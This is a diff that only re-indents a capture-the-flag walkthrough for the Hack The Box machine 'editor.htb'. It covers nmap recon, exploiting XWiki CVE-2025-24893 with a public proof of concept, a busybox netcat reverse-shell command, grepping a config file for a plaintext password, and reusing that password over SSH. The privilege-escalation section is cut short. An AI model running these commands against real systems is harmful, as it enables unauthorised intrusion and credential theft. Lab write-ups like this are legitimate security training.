@@ -3,14 +3,14 @@ Target:
   editor.htb
 
 --Setup Target In Hosts
-  echo -e "10.10.11.80\teditor.htb" | sudo tee -a /etc/hosts > /dev/null
+	echo -e "10.10.11.80\teditor.htb" | sudo tee -a /etc/hosts > /dev/null
 
 --Nmap
 	Starting with a port scan followed up with a versions/scripts scan
-  	nmap -sS -p- --min-rate=1000 -oN recon/ports.nmap editor.htb
-  	nmap -sSVC -p 22,80,8080 -oN recon/versions.nmap editor.htb
-	
-	We get ssh for ubuntu(22), nginx(80), and jetty(8080)
+	  	nmap -sS -p- --min-rate=1000 -oN recon/ports.nmap editor.htb
+	  	nmap -sSVC -p 22,80,8080 -oN recon/versions.nmap editor.htb
+		
+		We get ssh for ubuntu(22), nginx(80), and jetty(8080)
 	
 --HTTP exploration/exploitation
 	Looking around, I found a wiki subdomain, you have to add it to hosts with
@@ -18,26 +18,26 @@ Target:
 	
 	The wiki uses Xwiki, which has an RCE vulnerability for this version (15.10.8), CVE-2025-24893 
 	I downloaded the PoC from https://github.com/CMassa/CVE-2025-24893/blob/main/CVE-2025-24893.py and confirmed it was vulnerable with
-  	python3 CVE-2025-24893.py -t http://editor.htb:8080 --verify
+  		python3 CVE-2025-24893.py -t http://editor.htb:8080 --verify
 	
 	With the PoC, I made a reverse shell
-	  python3 CVE-2025-24893.py -t http://editor.htb:8080 --command "busybox nc [your host ip] 1111 -e /bin/bash"
+  		python3 CVE-2025-24893.py -t http://editor.htb:8080 --command "busybox nc [your host ip] 1111 -e /bin/bash"
 	
 	I recommend making it a smart shell
-    script /dev/null -c bash
-    [ctrl+z]
-    stty raw -echo;fg
-    [enter]
+	    script /dev/null -c bash
+	    [ctrl+z]
+	    stty raw -echo;fg
+	    [enter]
 
 --Initial to User access
 	
 	After researching and manual searching config files, i found a password in a config file -- theEd1t0rTeam99
-  	cat webapps/xwiki/WEB-INF/hibernate.cfg.xml | grep "password"
+	  	cat webapps/xwiki/WEB-INF/hibernate.cfg.xml | grep "password"
 	
 	using cat /etc/passwd we can see there are 2 users, oliver, _laurel
 	The password ended up working for oliver
-    ssh oliver@editor.htb
-    theEd1t0rTeam99
+		ssh oliver@editor.htb
+		theEd1t0rTeam99
 	
 --User to Root Access
   Read the flag
